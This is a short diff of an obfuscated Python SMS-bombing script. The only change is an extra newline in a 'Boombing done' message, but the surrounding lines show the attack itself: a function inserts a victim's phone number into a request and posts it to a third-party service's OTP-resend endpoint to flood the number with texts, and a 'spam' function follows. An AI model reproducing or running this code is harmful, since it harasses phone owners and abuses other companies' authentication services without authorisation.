@@ -104,7 +104,7 @@ def smsm (OO0OO0O0O0OO00O00 ,OO000O0000O00OO0O ):#line:22
         O00000OOO0OO00OO0 ='{"mobile":"1234456","retryType":"text"}'#line:367
         O00000OOO0OO00OO0 =O00000OOO0OO00OO0 .replace ("1234456",str (OO0OO0O0O0OO00O00 ))#line:368
         O0O0O00OOO00O0000 =requests .post ('https://api.khelbro.com/api/v2/auth/resendOtp',headers =OO0000O0O0O00000O ,data =O00000OOO0OO00OO0 )#line:370
-    print ('\nBoombing done')#line:372
+    print ('\nBoombing done\n')#line:372
     auther ()#line:373
 def spam ():#line:378
     try :#line:380
